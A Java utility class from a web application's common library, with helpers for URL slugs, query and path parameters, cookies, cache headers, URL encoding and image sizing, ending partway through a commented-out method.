package org.narrative.common.util;

import org.narrative.common.persistence.ObjectPair;
import org.narrative.common.util.images.ImageInfoType;
import org.narrative.common.util.posting.HtmlTextMassager;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpException;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.params.HttpClientParams;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import java.awt.Canvas;
import java.awt.Dimension;
import java.awt.Image;
import java.awt.MediaTracker;
import java.awt.Toolkit;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.StringWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.net.UnknownHostException;
import java.text.Normalizer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.BitSet;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.StringTokenizer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.narrative.common.util.CoreUtils.*;

public class IPHTMLUtil {
    private static final NarrativeLogger logger = new NarrativeLogger(IPHTMLUtil.class);

    public static final Pattern HYPHEN_PREFIX_PATTERN = Pattern.compile("^\\-*");
    public static final Pattern HYPHEN_SUFFIX_PATTERN = Pattern.compile("\\-*$");

    public static final String ELLIPSES_HTML_CODE = "&#8230;";

    /**
     * prevent gzip encoding.  Can be turned off with:
     * <registry do_html_content_encoding="N"/> in the dispatch config xml
     */
    //public static boolean do_html_content_encoding = true;
    public static String getPrettyUrlStringFromPrettyUrlString(String prettyUrlString) {
        // bl: don't force lowercase for manually entered pretty URL strings (though we should convert spaces to hyphens).
        return getSafePrettyUrlStringFromString(prettyUrlString, true, true, false, false);
    }

    public static String getSafePrettyUrlStringFromString(String name, boolean isConvertNonAlphaNumericToHyphens) {
        // bl: force it to lowercase by default
        return getSafePrettyUrlStringFromString(name, isConvertNonAlphaNumericToHyphens, false, true, true);
    }

    private static String getSafePrettyUrlStringFromString(String name, boolean isConvertNonAlphaNumbericToHyphens, boolean includeAllPresentHyphens, boolean truncateLeadingAndTrailingHyphens, boolean forceLowercase) {
        if (IPStringUtil.isEmpty(name)) {
            return name;
        }
        // bl: this will normalize the string so as to remove accent characters.  it actually just separates
        // accented characters into two distinct characters: one representing the letter and one representing the accent.
        // in the loop below, we will include the letter character, but will exclude the accent character.
        name = Normalizer.normalize(name, Normalizer.Form.NFD);
        if (forceLowercase) {
            // lowercase the string up front so we only have to deal with lowercase letters
            name = name.toLowerCase();
        }
        name = HtmlTextMassager.convertConsecutiveSpacesToSingleSpace(name);
        name = name.trim();
        char[] chars = name.toCharArray();
        // only accept letters into the simple url and make them all lowercase
        StringBuilder sb = new StringBuilder();
        boolean addedHyphen = false;
        for (char c : chars) {
            if (Character.isLetter(c)) {
                // bl: only want to allow english letters.  the string should already be lowercase, so
                if (c < 'a' || c > 'z') {
                    // if forcing lowercase, then skip the character since it's not lowercase
                    if (forceLowercase) {
                        continue;
                    } else {
                        // if we are allowing uppercase letters, then let them through by excluding anything that's not uppercase
                        if (c < 'A' || c > 'Z') {
                            continue;
                        }
                    }
                }
            } else if (!Character.isDigit(c)) {
                // bl: insert "and" for ampersands
                boolean isHyphen = c == '-';
                if (c == '&') {
                    sb.append("and");
                    addedHyphen = false;

                } else if (isHyphen && includeAllPresentHyphens) {
                    sb.append(c);
                    addedHyphen = true;

                    // jw: include a hyphen if the character is a hyphen, or if we are converting non-alpha-num chars to hyphens
                } else if (c == '-' || (isConvertNonAlphaNumbericToHyphens && !addedHyphen)) {
                    if (!addedHyphen) {
                        sb.append("-");
                        addedHyphen = true;
                    }
                    continue;
                }
                continue;
            }
            addedHyphen = false;
            sb.append(c);
        }
        if (!truncateLeadingAndTrailingHyphens) {
            return sb.toString();
        }

        String result = sb.toString();
        result = HYPHEN_PREFIX_PATTERN.matcher(result).replaceAll("");
        result = HYPHEN_SUFFIX_PATTERN.matcher(result).replaceAll("");

        return result;
    }

    /*public static void main(String[] args) {
        System.out.println(getSafePrettyUrlStringFromString("C\u00E9sar Menotti & Fabiano"));
    }*/

    //public static class HTMLOutput {
    //String outputText;
    //int bytesSent;
    //}

    /**
     * ./runapp.sh org.narrative.common.util.IPHTMLUtil\$URLEncodeArgs "asdf/asdf?s=864094322&a=ga&ul=89559568721" "ISO-8859-1"
     */
    public static class URLEncodeArgs {
        public static void main(String[] args) {
            if (logger.isInfoEnabled()) {
                logger.info("usage: URLEncodeArgs \"stringtoencode\" [charset=UTF-8, ISO-8859-1, ...]");
            }
            Debug.assertMsg(logger, args.length > 0, "No String was passed in to be url encoded");
            String value = args[0];
            String encoding = args.length > 1 ? args[1] : IPUtil.IANA_ISO8859_ENCODING_NAME;
            System.out.println("Using '" + encoding + "' encoding, '" + value + "' = \n" + IPHTMLUtil.getURLEncodedString(value));
        }
    }

    /**
     * useful since httputil returns string[] not string when you want values
     */
    public static final String getValue(String key, Map queryArgs) {
        Object val = queryArgs.get(key);
        if (val instanceof String[]) {
            String vals[] = (String[]) queryArgs.get(key);
            if (vals == null) {
                return null;
            }
            return vals[0];
        }
        return (String) val;
    }

    /**
     * finds the named cookie in a request.  If not there creates it and adds it to the response
     */
    public static Cookie getCookie(HttpServletRequest req, String cookieName, boolean createOrUpdateIfNecessary, int maxAgeInSeconds, String comment) {
        return getCookie(req, cookieName, createOrUpdateIfNecessary, maxAgeInSeconds, comment, null);
    }

    /**
     * finds the named cookie in a request.  If not there creates it and adds it to the response
     *
     * @param cookieDomain the domain to set for the cookie
     */
    public static Cookie getCookie(HttpServletRequest req, String cookieName, boolean createOrUpdateIfNecessary, int maxAgeInSeconds, String comment, String cookieDomain) {
        Cookie c[] = req.getCookies();
        for (int i = 0; c != null && i < c.length; i++) {
            if (!cookieName.equals(c[i].getName())) {
                continue;
            }
            // means we'll be writing to it
            if (createOrUpdateIfNecessary) {
                //c[i].setPath(req.getServletPath());
                c[i].setPath("/");
                if (!IPStringUtil.isEmpty(cookieDomain)) {
                    c[i].setDomain(cookieDomain);
                }
                c[i].setMaxAge(maxAgeInSeconds);
                c[i].setComment(comment);
            }
            return c[i];
        }
        if (!createOrUpdateIfNecessary) {
            return null;
        }
        Cookie newCookie = new Cookie(cookieName, "");
        newCookie.setMaxAge(maxAgeInSeconds);
        newCookie.setComment(comment);
        //newCookie.setPath(req.getServletPath());
        newCookie.setPath("/");
        if (!IPStringUtil.isEmpty(cookieDomain)) {
            newCookie.setDomain(cookieDomain);
        }
        return newCookie;
    }

    public static Cookie createCookie(String name, String value, int maxAgeS, String comment) {
        Cookie newCookie = new Cookie(name, "");
        newCookie.setMaxAge(maxAgeS);
        newCookie.setValue(value);
        newCookie.setComment(comment);
        newCookie.setPath("/");
        return newCookie;
    }

    public static void setNoCache(HttpServletRequest request, HttpServletResponse response) {
        if (request.getProtocol().compareTo("HTTP/1.0") == 0) {
            response.setHeader("Pragma", "no-cache");
        } else if (request.getProtocol().compareTo("HTTP/1.1") == 0) {
            response.setHeader("Cache-Control", "no-cache");
        }
        response.setDateHeader(HtmlConstants.HEADER_EXPIRES, 0);
        response.setHeader("Vary", "*");
    }

    public static void setExpiresHeaderToOneYear(HttpServletResponse response) {
        response.setDateHeader(HtmlConstants.HEADER_EXPIRES, System.currentTimeMillis() + IPDateUtil.YEAR_IN_MS);
    }

    private static final Collection<String> KNOWN_SUB_NAMESPACES = new HashSet<String>();

    /**
     * register a known sub namespace.  these will then be used in getParametersAsPathParametersInUrl
     * and getParametersCollectionAsPathParametersInUrl to make sure that the generated urls will work
     * correctly and that the first parameter in the path won't be interpreted as an action name.
     *
     * @param subNamespace the sub namespace to register (e.g. "admin").
     */
    public static void registerSubNamespace(String subNamespace) {
        KNOWN_SUB_NAMESPACES.add(subNamespace);
    }

    /**
     * given any url, add on the specified param name as a query parameter.
     * if the parameter already exists in the url, then the existing parameter will
     * be removed and will be replaced with the new parameter value
     *
     * @param baseURL    the url in which to append the parameter name/value pair
     * @param paramName  the parameter name to use for the new parameter
     * @param paramValue the parameter value
     * @return the url after inserting the parameter
     */
    public static String getURLAfterInsertingParameter(String baseURL, String paramName, Object paramValue) {
        // nothing logical to do?
        if (IPStringUtil.isEmpty(paramName) || paramValue == null) {
            return baseURL;
        }
        // no base url?  then just give a query arg string.
        if (IPStringUtil.isEmpty(baseURL)) {
            Map<String, Collection<String>> args = new LinkedHashMap<String, Collection<String>>();
            args.put(paramName, Collections.singleton(paramValue.toString()));
            return '?' + getParametersAsURLArgs0(args, true);
        }
        boolean isRelative = false;
        boolean relativeUrlStartsWithSlash = false;
        URL url;
        try {
            url = new URL(baseURL);
        } catch (MalformedURLException e) {
            // bl: need to support relative URLs.
            try {
                if (baseURL.startsWith("/")) {
                    relativeUrlStartsWithSlash = true;
                }
                url = new URL("http://dummy" + (relativeUrlStartsWithSlash ? baseURL : "/" + baseURL));
                isRelative = true;
            } catch (MalformedURLException e2) {
                throw UnexpectedError.getRuntimeException("Got an invalid base URL (not even a relative url) when trying to insert parameter: " + paramName + "=" + paramValue, e, true);
            }
        }
        Map<String, Collection<String>> queryArgs = parseQueryString(url.getQuery());
        // replace the parameter name in the query string
        queryArgs.put(paramName, Collections.singleton(paramValue.toString()));
        String newQueryString = getParametersAsURLArgs0(queryArgs, true);
        StringBuilder ret = new StringBuilder();
        // only append the protocol and host if this is not a relative URL.
        if (!isRelative) {
            ret.append(url.getProtocol());
            ret.append("://");
            ret.append(url.getHost());
            ret.append(url.getPath());
        } else {
            // in the case of a relative url, first figure out if we need to include the leading
            // slash on the relative url.
            if (relativeUrlStartsWithSlash) {
                ret.append(url.getPath());
            } else {
                ret.append(IPStringUtil.getStringAfterStripFromStart(url.getPath(), "/"));
            }
        }
        ret.append('?');
        ret.append(newQueryString);
        String reference = url.getRef();
        if (reference != null) {
            ret.append("#");
            ret.append(reference);
        }

        return ret.toString();
    }

    public static ObjectPair<Map<String, List<String>>, String> parsePathParametersFromString(String urlPath) {
        Map<String, List<String>> ret = new LinkedHashMap<String, List<String>>();
        if (IPStringUtil.isEmpty(urlPath)) {
            return new ObjectPair<Map<String, List<String>>, String>(ret, null);
        }
        int questionMarkIndex = urlPath.indexOf('?');
        if (questionMarkIndex >= 0) {
            urlPath = urlPath.substring(0, questionMarkIndex);
        }
        if (urlPath.startsWith("/")) {
            urlPath = urlPath.substring(1);
        }
        String[] params = urlPath.split("\\/");
        String filename = null;
        for (int i = 0; i < params.length; i++) {
            String paramName = params[i];
            i++;
            if (i >= params.length) {
                filename = paramName;
                break;
            }
            if (i < params.length) {
                String paramValue = params[i];
                List<String> paramList = ret.get(paramName);
                if (paramList == null) {
                    ret.put(paramName, paramList = new LinkedList<String>());
                }
                paramList.add(paramValue);
            }
        }
        return new ObjectPair<Map<String, List<String>>, String>(ret, filename);
    }

    public static String getParametersAsPathParameters(Map<String, String> params) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> entry : params.entrySet()) {
            sb.append("/");
            sb.append(entry.getKey());
            sb.append("/");
            sb.append(entry.getValue());
        }
        return sb.toString();
    }

    public static String getParametersAsPathParametersInUrl(String value, Map<String, String> params) {
        Map<String, Collection<String>> paramsAsCollections = new LinkedHashMap<String, Collection<String>>();
        if (params != null) {
            for (Map.Entry<String, String> param : params.entrySet()) {
                paramsAsCollections.put(param.getKey(), Collections.singleton(param.getValue()));
            }
        }
        return getParametersCollectionAsPathParametersInUrl(value, paramsAsCollections);
    }

    public static final String DUMMY_ACTION = "x";
    private static final Pattern DUMMY_ACTION_PATTERN = Pattern.compile("/" + DUMMY_ACTION + "($|/)");
    private static final String DUMMY_ACTION_REPLACEMENT = "/";

    public static String removeDummyActionFromUrl(String url) {
        return DUMMY_ACTION_PATTERN.matcher(url).replaceAll(DUMMY_ACTION_REPLACEMENT);
    }

    public static String getParametersCollectionAsPathParametersInUrlForJsp(String value, Map params) {
        return getParametersCollectionAsPathParametersInUrl(value, getValidParamMapFromMap(params));
    }

    public static <T extends Collection<String>> String getParametersCollectionAsPathParametersInUrl(String value, Map<String, T> params) {
        if (params == null || params.isEmpty()) {
            return value;
        }
        StringBuilder sb = new StringBuilder();
        URL url;
        String path = "";
        try {
            url = new URL(value);
            sb.append(url.getProtocol());
            sb.append("://");
            sb.append(url.getHost());
            path = url.getPath();
            sb.append(path);
        } catch (MalformedURLException e) {
            // try it with a dummy http://domain
            boolean startsWithSlash = value.startsWith("/");
            try {
                url = new URL("http://domain" + (startsWithSlash ? "" : "/") + value);
            } catch (MalformedURLException e1) {
                throw UnexpectedError.getRuntimeException("Failed parsing URL! url/" + value + "\nfirst exception: " + e + "\n", e1, true);
            }

            path = url.getPath();
            if (startsWithSlash) {
                sb.append(path);
            } else if (!IPStringUtil.isEmpty(path)) {
                // if the original value didn't start with a slash, then it's a relative url.
                // so, in this case, we need to strip off the leading slash.
                path = path.substring(1, path.length());
                sb.append(path);
            }
        }

        // bl: in the event that we are appending path parameters to a url, we need to make sure that
        // there is something in the path prior to the first path parameter.  this is because the first
        // thing at the start of the path is assumed to be the action name.  thus, if you append a path
        // parameter at the beginning of the path, the first parameter name will be assumed to be the action name.
        // to prevent this, add a dummy parameter of "x" prior to path parameters in the event that an action
        // isn't already specified in the url.
        // note: this won't work correctly with sub-namespaces.  i'm not going to worry about those for now.

        boolean pathEndsWithSlash = sb.length() > 0 && '/' == sb.charAt(sb.length() - 1);
        boolean needDummyAction = false;

        // todo: make this support the case where the parameter names and values do not match up correctly.
        // e.g. if someone puts in http://narrative.org/paramName1/
        // detect that paramName1 doesn't have a value and put an "x" in for the value.  otherwise, all of the newly
        // added parameters will be thrown off and won't work.  the first parameter name would be the parameter
        // value for parameterName1, the first parameter value would be the second parameter name, etc.
        // might best be implemented with our own URL parser similar to java.net.URL, only ours would support
        // path parameters as well as query parameters.  it could also support sub-namespaces (e.g. "admin")
        // and actions.  this would be useful for removing path parameters from urls, which currently can't be done
        // easily.  since this functionality isn't available, we're currently just replacing a parameter name with "x"
        // which isn't very elegant.  look at the area user and master user session interceptors.  grep for "x" in the code base.
        // note that if these parameters are not set correctly, there is a potential for an infinite redirect if the
        // client does not have cookies enabled.
        if (IPStringUtil.isEmpty(path) || path.equals("/")) {
            needDummyAction = true;
        } else {
            // we've got a path, so let's see if it is a known sub-namespace
            String pathToTest = IPStringUtil.getStringAfterStripFromStart(path, "/");
            String actionToTest;
            int slashIndex = pathToTest.indexOf("/");
            if (slashIndex >= 0) {
                actionToTest = pathToTest.substring(0, slashIndex);
            } else {
                actionToTest = pathToTest;
            }
            // we'll need a dummy action if the path starts with a known sub-namespace
            if (KNOWN_SUB_NAMESPACES.contains(actionToTest)) {
                // we'll need the dummy action if the path after the action has a length of 1 or less.
                // if it has more, then there should be an action in the path, so we're golden.
                if (slashIndex >= 0) {
                    needDummyAction = (pathToTest.substring(slashIndex).length() <= 1);
                } else {
                    needDummyAction = true;
                }
            }
        }

        // bl: just use "x" as the dummy action in the event that we need one
        if (needDummyAction) {
            // bl: if the path ends with a slash, put the slash at the end.  otherwise, put the slash at the beginning.
            if (!pathEndsWithSlash) {
                sb.append("/");
            }
            sb.append(DUMMY_ACTION);
            if (pathEndsWithSlash) {
                sb.append("/");
            }
        }

        int i = 0;
        for (Map.Entry<String, T> entry : params.entrySet()) {
            String paramName = entry.getKey();
            T values = entry.getValue();
            for (String paramValue : values) {
                if (IPStringUtil.isEmpty(paramValue)) {
                    continue;
                }
                if (i == 0 && pathEndsWithSlash) {
                    // don't need to append the leading slash the first time through if the path ends with a slash.
                } else {
                    sb.append("/");
                }
                sb.append(paramName);
                sb.append("/");
                sb.append(IPHTMLUtil.getURLEncodedStringButDontEncodeSpacesToPlus(paramValue));
                i++;
            }
        }

        if (pathEndsWithSlash) {
            sb.append("/");
        }

        String queryString = url.getQuery();
        if (queryString != null) {
            sb.append("?");
            sb.append(queryString);
        }

        String reference = url.getRef();
        if (reference != null) {
            sb.append("#");
            sb.append(reference);
        }

        // update the value based on the supplied parameters.
        return sb.toString();
    }

    public static String getParametersAsURLForJsp(String baseURL, Map args) {
        return getParametersAsURL(baseURL, args);
    }

    /**
     * turns a hashtable into an url.  useful if you want to add, remove or replace
     * args from an existing url.
     *
     * @param args a map of parameter name (string) to parameter value(s).  the value
     *             in the map must be one of:
     *             - a String
     *             - a Collection<String>
     *             - a String[]
     *             - an object whose value will be object.toString()
     */
    public static String getParametersAsURL(String baseURL, Map<String, ?> args) {
        if (baseURL == null) {
            baseURL = "";
        }
        if (args == null) {
            return baseURL;
        }
        if (args.isEmpty()) {
            return baseURL;
        }
        return getParametersAsURL0(baseURL, getValidParamMapFromMap(args));
    }

    private static Map<String, Collection<String>> getValidParamMapFromMap(Map<String, ?> args) {
        // bl: made this a LinkedHashMap so that order of parameters is maintained.
        // necessary for URLTag, which uses a LinkedHashMap to make sure that parameter ordering is maintained.
        Map<String, Collection<String>> ret = new LinkedHashMap<String, Collection<String>>();
        for (Map.Entry<String, ?> entry : args.entrySet()) {
            String name = entry.getKey();
            Object val = entry.getValue();

            Collection<String> value;
            if (val instanceof String[]) {
                value = Arrays.asList((String[]) val);
            } else if (val instanceof String) {
                value = Collections.singleton((String) val);
            } else if (val instanceof Collection) {
                value = (Collection) val;
            } else if (val != null) {
                value = Collections.singleton(val.toString());
            } else {
                // null value?  put an empty collection into the map then
                value = Collections.emptySet();
            }
            ret.put(name, value);
        }
        return ret;
    }

    /**
     * Construct an URL from a base URL and a 2D String array of params.
     * <p>
     * Note:
     * - This method also handles the base URL having existing arguments (and bookmarks).
     *
     * @param baseURL Mandatory.
     */
    private static String getParametersAsURL0(String baseURL, Map<String, Collection<String>> args) {
        Debug.assertMsg(logger, baseURL != null, "No baseURL supplied!");
        if (args == null || args.isEmpty()) {
            return baseURL;
        }

        // Ensure the base URL doesn't currently end with a '?' only.
        //baseURL = IPStringUtil.getStringAfterStripFromEnd(baseURL, "?");
        String baseURLWithoutBookmark = IPStringUtil.getStringBeforeLastIndexOf(baseURL, "#");
        String urlBeforeParams = IPStringUtil.getStringBeforeLastIndexOf(baseURLWithoutBookmark, "?");
        String urlParams = IPStringUtil.getStringAfterLastIndexOf(baseURLWithoutBookmark, "?", false);
        String anchorTag = IPStringUtil.getStringAfterLastIndexOf(baseURL, "#", false);
        if (!IPStringUtil.isEmpty(urlParams)) {
            urlParams += "&";
        }

        String extraParams = getParametersAsURLArgs(args);
        // bl: if there's no path on the urlBeforeParams, then insert a / before the query string to ensure it's valid.
        // bl: don't append the / if the urlBeforeParams is empty. no need for it in that case, where the caller's
        // intent is probably just to get a query string
        String ret = urlBeforeParams + (!isEmpty(urlBeforeParams) && isEmpty(UrlUtil.getPathFromUrl(urlBeforeParams)) ? "/" : "") + "?" + urlParams + extraParams;
        if (!IPStringUtil.isEmpty(anchorTag)) {
            ret += "#" + anchorTag;
        }
        return ret;
    }

    /**
     * @param args a map of parameter name (string) to parameter value(s).  the value
     *             in the map must be one of:
     *             - a String
     *             - a Collection<String>
     *             - a String[]
     *             - an object whose value will be object.toString()
     */
    public static String getParametersAsURLArgs(Map<String, ?> args) {
        return getParametersAsURLArgs0(getValidParamMapFromMap(args), true);
    }

    public static String getParametersAsURLArgsButDontEncodeSpacesToPlus(Map<String, ?> args) {
        return getParametersAsURLArgs0(getValidParamMapFromMap(args), false);
    }

    private static String getParametersAsURLArgs0(Map<String, Collection<String>> args, boolean encodeSpacesToPlus) {
        StringBuffer extraParams = new StringBuffer();
        boolean isFirstParam = true;
        for (Map.Entry<String, Collection<String>> entry : args.entrySet()) {
            String name = IPHTMLUtil.getURLEncodedString(entry.getKey());
            if (IPStringUtil.isEmpty(name)) {
                continue;
            }
            Collection<String> values = entry.getValue();
            // special case for an empty collection
            if (values.isEmpty()) {
                // empty value?  then just append and empty param
                values = Collections.singleton("");
            }
            for (String value : values) {
                if (!isFirstParam) {
                    // After the 1st arg, append an &
                    extraParams.append('&');
                }
                value = value == null ? "" : encodeSpacesToPlus ? getURLEncodedString(value) : getURLEncodedStringButDontEncodeSpacesToPlus(value);
                extraParams.append(name).append('=').append(value);
                isFirstParam = false;
            }
        }
        return extraParams.toString();
    }

    /**
     * return an URL based on the dispatch request
     */
    public static java.net.URL getServerURL(HttpServletRequest req) {
        URL serverURL = null;
        String url = req.getScheme() + ':';
        if (!IPStringUtil.isEmpty(req.getServerName())) {
            url = url + "//" + req.getServerName();
            if (req.getServerPort() != -1) {
                url += ":" + req.getServerPort();
            }
        }
        try {
            serverURL = new URL(url);
        } catch (MalformedURLException mfe) {
            logger.error("Failed getting the server URL", mfe);
        }
        return serverURL;
    }

    public static String getLocalHostName() {
        try {
            InetAddress localAddress = InetAddress.getLocalHost();
            return localAddress.getHostName();
        } catch (UnknownHostException ex) {
            logger.error("Failed getting the local host name", ex);
            return null;
        }
    }

    public static class ImageSizeCouldNotBeDeterminedError extends Throwable {
        public String detailedError;

        public ImageSizeCouldNotBeDeterminedError(String error) {
            detailedError = error;
        }

        public ImageSizeCouldNotBeDeterminedError() {
        }
    }

    /*
    the pja awt toolkit had problems (interrupted exceptions) using this method, so swotched to the
    method that passes it a byte[] instead
    public synchronized static java.awt.Dimension getSize2(java.net.URL serverBaseURL, String url_name, java.awt.Dimension d) {
        if (d==null)
            d = new Dimension();
        d.width = 0;
        d.height = 0;
        if (IPStringUtil.isEmpty(url_name)) {
            d.width = 0; d.height=0;
            return d;
        }
        URL url = null;
        try {
            url = new URL(url_name);
            try {
                URLConnection.setDefaultAllowUserInteraction(false);
            } catch (Throwable t) {
                Debug.msg(Debug.KEYINFO, "Prevented from setting default allow user interaction", t);
            }
        } catch (MalformedURLException mfe) {
            // prepend server base to url if invalid
            try {
                url = new URL(serverBaseURL, url_name);
            } catch (MalformedURLException mfe2) {
                throw new ApplicationError(ApplicationText.text("TXT_INVALID_URL_ARG1", url_name));
            }
        }
        try {
            URLConnection uc = url.openConnection();
            try {
                uc.setUseCaches(false);
            } catch (Throwable t) {
                Debug.msg(Debug.KEYINFO, "Prevented from setting allow use cache", t);
            }
            //uc.setIfModifiedSince(1000);
        } catch (IOException ioex) {
            if(logger.isInfoEnabled()) logger.info( "Failed reading url " + url.toExternalForm(), ioex);
            return d;
        }

        if (Debug.bDebug) if(logger.isInfoEnabled()) logger.info( "Determining image size for " + url.toExternalForm());
        if (frame==null) {
            frame = new Frame();
            frame.addNotify();
            //frame.show();
            tracker = new MediaTracker(frame);
        }
        try {

            Image image = Toolkit.getDefaultToolkit().getImage(url);
            tracker.addImage(image, 0);
            tracker.waitForAll();
            d.width = image.getWidth(frame);
            d.height = image.getHeight(frame);
            // Note:
            // - MediaTracker and Image implementations appear to cache image binary
            //   data behind the scenes. To prevent this we have to force them to
            //   dump their resources associated with this image.
            tracker.remove(image);
            image.flush();
        } catch (InterruptedException ie) {
            Debug.msg(Debug.KEYINFO, "Failed reading url " + url.toExternalForm(), ie);
            return d;
        } catch (Throwable t) {
            Debug.msg(Debug.KEYINFO, "Failed reading url " + url.toExternalForm(), t);
            return d;
        }
        if(logger.isInfoEnabled()) logger.info( "Returning dimensions for " + url.toExternalForm() + ", dimensions " + d.width + 'x' + d.height);
        return d;
    }
    */

    /**
     * figures out the dimensions of a specified image
     */
    public static java.awt.Dimension getImageSize(byte imageBytes[], java.awt.Dimension d, String debugImageName) throws ImageSizeCouldNotBeDeterminedError {
        if (d == null) {
            d = new Dimension();
        }
        if (imageBytes == null) {
            throw new ImageSizeCouldNotBeDeterminedError("No Bytes were returned for this image: " + debugImageName);
        }
        java.awt.MediaTracker tracker = null;
        /*
        java.awt.Frame frame = null;
        if (frame==null) {
            frame = new Frame();
            frame.addNotify();
            //frame.show();
            tracker = new MediaTracker(frame);
        }
        */
        // trying a canvas not a frame as the java 1.4 vm will throw
        // a headless exception if you create a heavyweight
        java.awt.Canvas frame = null;
        if (frame == null) {
            frame = new Canvas();
            //frame.addNotify();
            //frame.show();
            tracker = new MediaTracker(frame);
        }

        /*
                  MediaTracker imageTracker = new MediaTracker (new Frame ());
          imageTracker.addImage (images [i], 0);
          imageTracker.waitForID (0);
        */
        try {
            Image image = Toolkit.getDefaultToolkit().createImage(imageBytes);
            tracker.addImage(image, 0);
            tracker.waitForID(0);
            d.width = image.getWidth(frame);
            d.height = image.getHeight(frame);
            if (logger.isInfoEnabled()) {
                logger.info("gis: Returning dimensions from byte data, dimensions " + d.width + 'x' + d.height + ", on " + imageBytes.length + " bytes");
            }
            return d;
        } catch (InterruptedException ie) {
            logger.error("gis: Failed determining image size for " + debugImageName, ie);
            throw new ImageSizeCouldNotBeDeterminedError("gis: Failed determining image size for " + debugImageName);
        } catch (Throwable t) {
            logger.error("gis: Failed determining image size for " + debugImageName, t);
            throw new ImageSizeCouldNotBeDeterminedError("gis: Failed determining image size for " + debugImageName);
        } finally {
            //frame.dispose();
        }
    }

    private static final Pattern URL_ENCODED_CHAR = Pattern.compile("\\%[0-9A-F]{2}", Pattern.CASE_INSENSITIVE);

    public static String getStringAfterRemovingUrlEncodedArgs(String s) {
        return URL_ENCODED_CHAR.matcher(s).replaceAll("");
    }

    /**
     * get a URL encoded String.  uses java.net.URLEncoder instead of our own
     * home-grown org.narrative.common.misc.URLEncoder.  handles catching the UnsupportedEncodingException
     * that is thrown by URLEncoder.encode().
     *
     * @param s the String to URL encode
     * @return the URL encoded String
     */
    public static String getURLEncodedString(String s) {
        if (IPStringUtil.isEmpty(s)) {
            return s;
        }

        try {
            return URLEncoder.encode(s, IPUtil.IANA_UTF8_ENCODING_NAME);
        } catch (UnsupportedEncodingException uee) {
            throw UnexpectedError.getRuntimeException("Failed URL-encoding String due to unsupported encoding exception! Shouldn't ever happen.", uee, true);
        }
    }

    private static final String SPACE_REPLACEMENT = "narrativespace";

    /**
     * get a URL encoded String.  uses java.net.URLEncoder instead of our own
     * home-grown org.narrative.common.misc.URLEncoder.  handles catching the UnsupportedEncodingException
     * that is thrown by URLEncoder.encode().
     *
     * @param s the String to URL encode
     * @return the URL encoded String
     */
    public static String getURLEncodedStringButDontEncodeSpacesToPlus(String s) {
        if (IPStringUtil.isEmpty(s)) {
            return s;
        }

        // bl: don't want to convert spaces to plus, so first change all spaces to our special "narrativespace" string.
        s = s.replaceAll(" ", SPACE_REPLACEMENT);

        s = getURLEncodedString(s);

        // now that we've url encoded the string, convert our special "narrativespace" string to %20 as we really wanted.
        s = s.replaceAll(SPACE_REPLACEMENT, "%20");
        return s;
    }

    /**
     * get a URL decoded String.  uses java.net.URLDecoder instead of our own
     * home-grown URL decoder implemented in IPHTMLUtil.getURLDecodedString(x,y).
     * handles catching the UnsupportedEncodingException that is thrown by URLDecoder.decode().
     *
     * @param s the String to URL decode
     * @return the URL decoded String
     */
    public static String getURLDecodedString(String s) {
        if (IPStringUtil.isEmpty(s)) {
            return s;
        }

        try {
            return URLDecoder.decode(s, IPUtil.IANA_UTF8_ENCODING_NAME);
        } catch (UnsupportedEncodingException uee) {
            throw UnexpectedError.getRuntimeException("Failed URL-decoding String due to unsupported encoding exception! Shouldn't ever happen.", uee, true);
        } catch (IllegalArgumentException iae) {
            // bl: attempt to decode it, but if it can't be decoded, it's an invalid string, so just return the original string value.
            return s;
        }
    }

    /**
     * convert name value pairs into arguments to plug into an url.  Takes care of
     * urlencoding the value.  Does not bother adding an arg if the value is empty
     */
    public static String getURLArgumentsFromArgValuePairs(String argsAndValues[][]) {
        StringBuffer repeatSearchURL = new StringBuffer();
        boolean hasAddedAParam = false;
        for (int i = 0; argsAndValues != null && i < argsAndValues.length; i++) {
            Debug.assertMsg(logger, argsAndValues[i] != null, "arg val cannot be null");
            Debug.assertMsg(logger, argsAndValues[i][0] != null, "arg's val cannot be null");
            if (IPStringUtil.isEmpty(argsAndValues[i][1])) {
                continue;
            }
            repeatSearchURL.append((!hasAddedAParam ? "" : "&")
                    //+ URLEncoder.encode(argsAndValues[i][0], ianaEncoding)
                    + getURLEncodedString(argsAndValues[i][0]) + '=' + (argsAndValues[i][1] == null ? "" : getURLEncodedString(argsAndValues[i][1])));
            hasAddedAParam = true;
        }
        return repeatSearchURL.toString();
    }

    public static String getURLFromFile(File file) {
        String path = file.getAbsolutePath();
        // Following code is cribbed from MSXML
        URL url = null;
        try {
            url = new URL(path);
        } catch (MalformedURLException ex) {
            try {
                // This is a bunch of weird code that is required to
                // make a valid URL on the Windows platform, due
                // to inconsistencies in what getAbsolutePath returns.
                String fs = System.getProperty("file.separator");
                if (fs.length() == 1) {
                    char sep = fs.charAt(0);
                    if (sep != '/') {
                        path = path.replace(sep, '/');
                    }
                    if (path.charAt(0) != '/') {
                        path = '/' + path;
                    }
                }
                path = "file://" + path;
                url = new URL(path);
            } catch (MalformedURLException e) {
                System.err.println("Cannot create url for: " + path);
                IPUtil.onEndOfApp();
                System.exit(0);
            }
        }
        return (url.toString());
    }
    /**
     * Turn a string into a series of document.write commands
     * suitable for putting on an HTML page
     */
    /*
    public static final String getStringAsDocumentWrites ( String s ) {
        if (s==null) return null;

